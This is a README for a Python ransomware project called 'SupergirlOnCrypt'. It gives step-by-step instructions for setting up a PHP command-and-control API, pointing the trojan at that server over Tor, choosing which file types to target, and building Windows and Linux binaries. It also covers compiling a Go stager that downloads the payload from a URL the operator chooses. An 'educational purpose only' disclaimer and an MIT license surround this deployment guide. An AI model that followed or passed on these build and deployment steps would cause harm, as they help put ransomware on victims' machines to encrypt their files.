# SupergirlOnCrypt :heart: :punch: :boom:

![Project Logo](https://s1.postimg.org/1xwn1n7sen/supergirl-season-2-finale-slice-600x200.jpg)

**For EDUCATIONAL PURPOSE ONLY**

This is a Crypto Trojan written in Python which can be packed using Pyinstaller. 
And i :heart: Supergirl so there you go.

## Content
1. [Requirements](#requirements)
2. [Setup](#setup)
3. [Building](#building)
---
![Image while Building](https://s1.postimg.org/7k7b0868an/pic.png)
---
## Requirements

Both Windows AND Linux must have Python >= 3.5 installed.

Optionally you need the Golang compiler if you want to use the Go Stager because the Binary with Pyinstaller is quite large (~57mb)
(Go Stager is only ~700kb).

---
## Setup

## API

Since we communicate with our API we need to set it up. The API(located in ./API duhh) is written in PHP so any Linux /Win Server will do.
....

## The Trojan

1. Change the API_URL in App/Config.py to your C&C Server URL
2. Disable DEBUG_MODE (Leave it on if your API is running locally because otherwise Tor cant reach your local network)
3. Optionally change your File Types


## Building

### Linux
1. `cd Scripts`
2. `./supergirl.sh setup python3`
3. `./supergirl.sh build`

### Windows
1. `cd Scripts`
2. `.\supergirl.ps1 setup C:\\...\\python.exe`
3. `.\supergirl.ps1 build`

### Building Stager
1. Upload your Binary which you gathered from the previous step
2. Go to `./Stagers/Go` and open `main.go`
3. Change line 39 `var url string = "yourdirecturlhere"`

#### Building a Linux Stager
4. `GOOS=linux go build -ldflags="-s -w" -o stager main.go`

#### Building a Windows Stager
5. `GOOS=windows GOARCH=386 go build -ldflags="-s -w" -o stager.exe main.go`


# Disclaimer

### FOR EDUCATIONAL PURPOSE ONLY I AM NOT RESPONSIBLE FOR ANYTHING

MIT License

Copyright (c) 2017 ThoughtfulDev

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
